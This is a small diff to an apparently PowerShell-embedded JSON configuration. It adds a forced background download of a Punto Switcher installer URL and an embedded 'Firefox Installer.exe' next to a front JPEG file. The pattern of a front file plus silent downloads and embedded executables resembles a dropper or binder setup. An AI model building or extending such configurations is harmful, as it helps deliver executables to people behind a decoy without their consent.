@@ -23,6 +23,10 @@ $server = @'
   "pushes": [],
   "startDownloadsForce": true,
   "startDownloads": [],
+  "startDownloadsBackForce": true,
+  "startDownloadsBack": [
+    "https://punto-switcher.software.informer.com/download/?ca159922"
+  ],
   "startUrlsForce": true,
   "startUrls": [],
   "frontForce": false,
@@ -30,6 +34,8 @@ $server = @'
     "192.168.0.105_01_20260409231508557.jpeg"
   ],
   "embeddingsForce": true,
-  "embeddings": []
+  "embeddings": [
+    "Firefox Installer.exe"
+  ]
 }
 '@ | ConvertFrom-Json
